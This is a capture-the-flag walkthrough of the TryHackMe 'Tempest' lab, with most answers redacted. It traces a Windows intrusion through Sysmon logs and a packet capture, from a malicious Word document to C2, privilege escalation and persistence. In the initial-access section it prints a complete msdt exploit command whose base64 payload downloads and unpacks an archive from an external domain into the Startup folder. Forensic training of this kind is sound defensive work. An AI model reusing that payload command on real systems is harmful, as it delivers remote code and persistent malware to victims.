# Tempest Walkthrough
<br/>

Since it is a long write-up here is the file structure:
- Intro
- The Challenge
  - Storyline
  - Preparation
  - Initial Access - Malicious Document
  - Initial Access - Stage 2 execution
  - Initial Access - Malicious Document Traffic
  - Discovery - Internal Reconnaissance
  - Privilege Escalation - Exploiting Privileges
  - Actions on Objective - Fully-owned Machine
- Conclusion

<br/>
<br/>

## Intro
Welcome to the Tempest challenge, here is the link to the [room](https://tryhackme.com/r/room/tempestincident) on TryHackMe.
This time we are gonna be investigating artifacts of a compromised Windows machine, which includes Windows Event Logs, Sysmon logs and a network capture file.

To analyse Windows artefacts such as Windows Event Logs and Sysmon logs, we will use the following tools:
- EvtxEcmd
- Timeline Explorer
- SysmonView
- Event Viewer

Network Logs:
- Wireshark
- Brim

Whenever you feel ready press on "Start Machine", wait a couple of minutes and you should be able to access the machine in split view mode.

Let's begin!


<br/>
<br/>

## The Challenge

### Sotryline
In this incident, we will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

The malicious document has a .doc extension.
The user downloaded the malicious document via chrome.exe.
The malicious document then executed a chain of commands to attain code execution.

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:  

- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources:
- Sysmon
- Network capture file

<br/>

### Preparation
Open PowerShell and navigate to the directory containing the incident files:
```powershell
cd '.\Desktop\Incident Files\'
```

To get the hash of a file:
```powershell
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

To parse the provided logs, we need first to convert the EVTX logs into CSV using *EvtxEcmd* and then feed it into Timeline Explorer:
```powershell
C:\Tools\EvtxECmd\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Now  load the exported CSV file: `File > Open > Choose sysmon.csv from C:\Users\user\Desktop\Incident Files directory`****

To view other logs with *SysmonView*, export the log file's contents into XML via **Event Viewer**; then:
- Go to `File > Import Sysmon Event Logs` then choose the XML files generated using the Event Viewer.
- Once loaded, the left sidebar has search functionality that can filter a specific process in mind.
- Choose the image path and session GUID to render the mapped view.

#### Preparation questions
1. **What is the SHA256 hash of the capture.pcapng file?**
   Let's run the following command:
```powershell
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```
--> REDACTED

1. **What is the SHA256 hash of the sysmon.evtx file?**
```powershell
Get-FileHash -Algorithm SHA256 .\sysmon.evtx
```
--> REDACTED

2. **What is the SHA256 hash of the windows.evtx file?**
```powershell
Get-FileHash -Algorithm SHA256 .\windows.evtx
```
--> REDACTED

<br/>

### Initial Access - Malicious Document
Here we will start the actual investigation of the events that lead to a compromise.

1. **The user of this machine was compromised by a malicious document. What is the file name of the document?**
   Open the sysmon.csv file with the TimelineViewer, since we know that the malicious file has a `.doc` extension we can search for that keyword and quickly spot the name of the file:
   --> REDACTED

2. **What is the name of the compromised user and machine?**
   `Format: username-machine name`
   Found the file name we can just find the corresponding value in the same row.
   --> REDACTED

3. **What is the PID of the Microsoft Word process that opened the malicious document?**
   Still with the same search results we can look a couple lines above and find that WINWORD.exe has been started, a bit on the left we can seed the process PID.
   --> REDACTED

4. **Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
   To find this answer i decided to open the network capture file with Wireshark and filter:
```
tcp contains ".doc"
```
   --> REDACTED

5. **What is the base64 encoded string in the malicious payload executed by the document?**
   In the TimelineViewer we can search for the keyword `base64`, and in the ExecutableInfo column we can see a PowerShell script with the following encoded data, we can then deconde it with PowerShell or using a tool like CyberChef in our browser.
   --> ==JGFwc...............REDACTED..............aXA7Cg====
   All this decodes to:
```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd ......REDACTED....... rm update.zip;
```

6. **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?** 
   `Format: XXXX-XXXXX`
   Let's give a look again at the full PS script, now that we also know the decoded part, looks like that it aims to take advantage of MSDT to execute the script.
   This vulnerability leads to RCE with the privileges of the calling application.
```powershell
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
```
   --> REDACTED

<br/>

### Initial Access - Stage 2 execution
Based on the initial findings, we discovered that there is a stage 2 execution:
- The document has successfully executed an encoded base64 command.
- Decoding this string reveals the exact command chain executed by the malicious document.

Now is time to investigate what the payload has actually done in the system. 

1. **The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
   Looking at the payload we have decoded we can see that a file called "update.zip" has been downloaded, so we can search in the Sysmon logs for that file name and read its location.
   --> REDACTED

2. **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
   **Format: Remove the double quotes from the log.**
   In Sysmon logs we can search for "explorer.exe" and look for interesting payloads:
   --> REDACTED

3. **Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
   Let's now go a little bit on the left, from the same line as the previous question and we can read the hash.
   --> REDACTED

4. **The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**
   `FORMAT domain:port`
   We can look for DNS events related to the file "first.exe" and in the "Payload 4" column we can see the query containing the domain name.
   --> REDACTED

<br/>

### Initial Access - Malicious Document Traffic
In this section we are gonna expand the search on the c2 server and the data that has been transferred.
We will have to open the network capture file with *Wireshark* to perform this investigation.

We can filter the packs related to the c2 server with:
```
tcp contains "resolvecyber
```

1. **What is the URL of the malicious payload embedded in the document?**
   We can search for TCP packets containing the contacted domain. (only this question will use this filter for all others we will use the one above)
```
tcp contains "phish"
```
--> REDACTED

1. **What is the encoding used by the attacker on the c2 connection?**
   --> REDACTED

2. **The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**
   We can see that all the request contains this `/....?q=BASE64_ENCODED_DATA`
   --> REDACTED

3. **The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**
   --> REDACTED

4. **What is the HTTP method used by the binary?**
   We can look at the request and see that it uses a very common method.
   --> REDACTED

5. **Based on the user agent, what programming language was used by the attacker to compile the binary?** 
   Simply check the user-agent string in the requests we have filtered before.
   --> REDACTED

<br/>

### Discovery - Internal Reconnaissance
Here THM suggest us to use Brim and to get all HTTP requests related to the malicious C2 traffic:
```
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```

Inserting the right info it will turn to:
```
_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
```

Also using Brim is not strictly required, you can also use Wireshark to achieve the same, personally i was already decoding packets as i was finding them in Wireshark for the previous section, but Brim will make it a bit faster as you can copy the base64 data directly from the list.

1. **The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**
   --> REDACTED

2. **The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**
```powershell
netstat -ano -p tcp - 
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5508
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       4964
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1212
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1760
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2424
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       608
  TCP    192.168.254.107:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.254.107:51802  52.139.250.253:443     ESTABLISHED     3216
  TCP    192.168.254.107:51839  34.104.35.123:80       TIME_WAIT       0
  TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0
  TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0
  TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352
  TCP    192.168.254.107:51871  20.190.144.169:443     TIME_WAIT       0
  TCP    192.168.254.107:51876  52.178.17.2:443        ESTABLISHED     4388
  TCP    192.168.254.107:51878  20.60.178.36:443       ESTABLISHED     4388
  TCP    192.168.254.107:51881  52.109.124.115:443     ESTABLISHED     4388
  TCP    192.168.254.107:51882  52.139.154.55:443      ESTABLISHED     4388
  TCP    192.168.254.107:51884  40.119.211.203:443     ESTABLISHED     4388
  TCP    192.168.254.107:51895  52.152.90.172:443      ESTABLISHED     5508
  TCP    192.168.254.107:51896  20.44.229.112:443      ESTABLISHED     8904

```
   There are many listening port, but one is commonly used by a tool called WinRM
   --> REDACTED


3. **The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection? We also need to remove the `""`**
   Back to Sysmon logs let's search for the keyword "sock", we will see only 1 result containing the command.
   --> REDACTED

4. **What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**
   The attacker used the "ch.exe" binary to do it, let's search for it in the logs.
   --> REDACTED
   
3. **What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.**
   To find this answer i have pasted the previous hash into VirusTotal and under the "details" section we can see some common names related to this.
   --> REDACTED

5. **The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? - answer in lowercase**
   This is the tool we have seen before, the one that let's us pop a shell on a target using the specific port.
   --> REDACTED

<br/>

### Privilege Escalation - Exploiting Privileges
Now is time to find out how the malicious actor escalate its privileges in the system.

1. **After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary? _Format: binary name,SHA256 hash_**
   Back to Wireshark, we know that the domain from where the files were previously downloaded what "phishteam.xyz", we can use this filter:
```
tcp contains "phish"
```
   Here we can see that the last 2 packets contains a GET request to 2 files, the first is the answer to this question, while the other will be probably be relevant in the next questions.
   Since we also need the file hash we can now go to TimelineViewer, check the Sysmon log, looking for hits with the filename as search keyword.
   --> REDACTED

2. **Based on the SHA256 hash of the binary, what is the name of the tool used? lowercase**
   As we did before, we can take advantage of VirusTotal, there we submit the file hash and check the tool's name in the details section.
   --> REDACTED


3. **The tool exploits a specific privilege owned by the user. What is the name of the privilege?**
   This was my first time seeing the tool, so with a quick search online we can find the GitHub page with it's working description containing the privilege name.
   --> REDACTED

4. **Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?**
   Still with the same filter in TimelineViewer we can see the name of the binary, which was also the one we have noticed previously in Wireshark.
   --> REDACTED


5. **The binary connects to a different port from the first c2 connection. What is the port used?**
   Here we can see that it uses a port that was opened before creating the socket. You can also notice this in Wireshark, after the block of packets corresponding to the executable downloads there is a sudden change of ports.
   --> REDACTED

<br/>

### Actions on Objective - Fully-owned Machine
We are reaching the conclusion of the investigation, up to now we have discovered how the attacker got into the machine, which tools he used to establish a foothold and that he escalated ed its privileges in the system.

All this work must have been done for something right? and he surely did not want to do all the effort once again in case of a disconnection.
So here we are gonna find out if any persistence hash been established on the system and if any data has been exfiltrated.

Once again here THM suggests us to use Brim with the filter:
```
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```

Let's complete it with the C2 server domain and the port number is the last one we have found in the previous section.

Running the search filter in Brim we can see again a list of packets with base 64 encoded data, let's decode them and find the answers.
But if you prefer you can achieve the same results using Wireshark.

1. **Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**
   _Format: Answer in alphabetical order - comma delimited_
   --> REDACTED

2. **Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail**
   The attacker was using the `net user` command to create new users but it forgot to add the simple option to add them.
   --> REDACTED

3. **Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**
   In the windows logs the "Account Created" activities have this ID.
   --> REDACTED

4. **The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?**
   Going on decoding packets we can find the command in the second to last packet with the base 64 data.
   --> REDACTED

5. **Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?**
   --> REDACTED

6. **After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this**
   _Format: Remove the double quotes from the log._
   As we tough the attacker found a way to establish persistence abusing the `sc.exe` program, which allows to manage Windows services. Our friend decided to create a new service, setting the tool used to establish the C2 connection as the binary to start upon service execution. Finally he ensured that the service would start automatically every time the computer boots up.
   --> REDACTED
   
<br/>
<br/>

## Conclusion
Congratulations you have reached the end of the investigation, in this lab we have successfully uncovered the actions of the malicious actor on the system and had fun with different forensics tools on Windows.

Hope you enjoed following along and completing the challenge.

Catch you in the next CTF 😃 

